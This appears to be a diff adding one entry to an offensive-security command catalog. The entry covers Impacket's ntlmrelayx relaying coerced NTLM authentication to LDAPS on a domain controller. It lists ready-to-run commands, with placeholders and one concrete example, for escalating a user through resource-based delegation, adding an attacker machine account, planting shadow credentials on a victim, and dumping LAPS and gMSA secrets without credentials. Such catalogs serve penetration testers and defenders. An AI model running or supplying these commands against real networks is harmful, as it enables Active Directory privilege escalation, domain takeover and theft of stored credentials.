@@ -1,0 +1,21 @@
+{
+  "id": "ntlmrelayx-ldaps",
+  "name": "ntlmrelayx → LDAPS (Add Computer / RBCD / Shadow Creds)",
+  "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --delegate-access --escalate-user '<attacker>' --no-smb-server",
+  "description": "Relay coerced authentication to LDAPS — required when MIC and channel binding force LDAP signing. Common payloads: --add-computer (then RBCD), --delegate-access (set msDS-AllowedToActOnBehalfOfOtherIdentity), --shadow-credentials.",
+  "platform": "linux",
+  "requires": ["no-creds"],
+  "protocols": ["ldap", "ntlm"],
+  "tags": ["impacket", "ntlmrelayx", "relay", "ldaps", "rbcd", "shadow-credentials"],
+  "variations": [
+    { "label": "Add Computer", "requires": "no-creds", "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --add-computer ATTACKERPC --no-smb-server" },
+    { "label": "Shadow Credentials", "requires": "no-creds", "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --shadow-credentials --shadow-target '<victim>' --no-smb-server" },
+    { "label": "Dump Domain", "requires": "no-creds", "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --dump-laps --dump-gmsa --no-smb-server" }
+  ],
+  "references": [
+    { "title": "ntlmrelayx", "url": "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py" }
+  ],
+  "examples": [
+    "impacket-ntlmrelayx -t ldaps://10.10.10.10 --delegate-access --escalate-user jdoe --no-smb-server"
+  ]
+}
